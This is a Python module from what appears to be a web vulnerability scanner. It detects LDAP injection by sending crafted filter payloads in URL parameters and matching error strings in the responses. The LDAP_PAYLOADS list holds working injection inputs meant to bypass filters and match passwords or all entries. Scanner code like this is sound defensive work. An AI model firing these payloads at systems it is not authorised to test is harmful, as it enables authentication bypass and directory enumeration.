"""
LDAP Injection Detection
OWASP A03:2021 - Injection
"""

import requests
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


LDAP_PAYLOADS = [
    '*',
    '*)(uid=*))(|(uid=*',
    '*()|%26',
    '*)(|(password=*))',
    '*))(|(objectClass=*',
    '\\2a',
    'admin*',
    'admin)(&(password=*))',
]

# Signs that LDAP injection may have succeeded
LDAP_SUCCESS_SIGNS = [
    'invalid credentials',
    'ldap error',
    'distinguished name',
    'objectclass',
    '0x52e',
    'javax.naming',
    'ldapexception',
    'bind failed',
]


class LDAPInjectionModule:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'SecureScan/1.0'})

    def test_url(self, url: str) -> List[Dict[str, Any]]:
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return findings

        try:
            baseline = self.session.get(url, timeout=8)
            baseline_len = len(baseline.text)
        except Exception:
            return findings

        for param in params:
            for payload in LDAP_PAYLOADS:
                test_params = {**{k: v[0] for k, v in params.items()}, param: payload}
                test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                try:
                    resp = self.session.get(test_url, timeout=8)
                    resp_lower = resp.text.lower()

                    # Check for LDAP error disclosure
                    for sign in LDAP_SUCCESS_SIGNS:
                        if sign in resp_lower:
                            findings.append({
                                "name": "LDAP Injection",
                                "severity": "high",
                                "owasp_category": "A03:2021",
                                "url": test_url,
                                "parameter": param,
                                "confidence": 80,
                                "technique": "LDAP Filter Injection",
                                "evidence": {
                                    "payload": payload,
                                    "error_indicator": sign,
                                    "response_snippet": resp.text[:300]
                                },
                                "poc": f"curl '{test_url}'",
                                "remediation": "Use parameterized LDAP queries. Escape special characters: \\, *, (, ), NUL using RFC 4515 escaping."
                            })
                            break
                    # Also check for unexpected content difference (wildcard match returning data)
                    if payload == '*' and len(resp.text) > baseline_len + 500:
                        findings.append({
                            "name": "Potential LDAP Injection (Wildcard Enumeration)",
                            "severity": "medium",
                            "owasp_category": "A03:2021",
                            "url": test_url,
                            "parameter": param,
                            "confidence": 60,
                            "technique": "LDAP Wildcard Filter",
                            "evidence": {
                                "payload": payload,
                                "baseline_len": baseline_len,
                                "fuzzed_len": len(resp.text)
                            },
                            "poc": f"curl '{test_url}'",
                            "remediation": "Escape LDAP special characters. Avoid dynamic LDAP filter construction."
                        })
                except Exception:
                    continue

        return findings

    def scan(self, urls: List[str]) -> List[Dict[str, Any]]:
        all_findings = []
        for url in urls:
            all_findings.extend(self.test_url(url))
        return all_findings
